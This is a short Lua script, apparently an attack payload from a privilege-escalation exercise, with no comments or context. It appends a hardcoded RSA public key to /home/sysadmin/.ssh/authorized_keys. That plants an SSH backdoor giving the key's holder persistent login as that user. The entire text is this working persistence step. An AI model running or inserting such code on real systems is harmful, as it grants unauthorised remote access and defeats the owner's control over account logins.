file = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
io.output(file)
io.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZOw1rymRpf9KpCY4NU7oyvK9MKxTmb0SAL809R1ad6liLCWWdbVgUR/JgdNK0ufyThKubbeZpdciOveS+GP9m/ATxEYzPoiNM8Z4cKmL04ah50ZRO+wnTr7+lKeb7hDYz/HxfNYRuhSX5Kidi3t3i7+rL/ZaHCK+cy5zjB0T3QubzjsPWqtlus6Jc64S/JFfcYmut8gjEFD4trQngN+W4ZQcXNnm/6m3+Z0el/W+m6sy79D3q/n/V80smmGiweDb6yxVXSk81A9DMgRKvN/CncGo913Zgynoy3tXp+32eMNPoJFGuoMqn7hlk57GIZ44Ou/qUD7mPa/JQMrr8ucGUyUZ4H31YU8QpQDO8vxmg7GKoZI50+fSQvFkiwgHZ0J4NQ8tnio5/O9lrDFmEfTFLw+waXwLrMAFU2wLbeWgLmYfdQ1WWC/qTk9gXQsPdDZtGpjS2TT842SNHUlzMuFnj2KGECQpKGkpj99K6iXMR6F5r04c5P3++ZewDgrcsF38=")
io.close(file)
